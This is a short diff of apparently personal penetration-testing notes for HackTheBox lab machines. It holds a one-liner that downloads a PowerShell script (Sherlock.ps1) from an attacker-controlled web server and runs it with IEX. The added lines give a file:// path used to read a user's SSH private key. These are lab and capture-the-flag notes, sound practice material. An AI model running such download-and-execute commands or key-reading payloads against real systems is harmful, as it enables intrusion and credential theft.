@@ -357,3 +357,6 @@ ps -ef | grep root # for all the root running processes on linux
 
 Dowload powershell script and execute it through powershell from cmd prompt (ippsec bastard):
 echo IEX(New Object Net.WebClient).DownloadString('http://10.10.15.1:8000/Sherlock.ps1') | powershell -noprofile -
+
+Path to id_rsa:
+file:///home/roosa/.ssh/id_rsa'> (htb devoops rk)
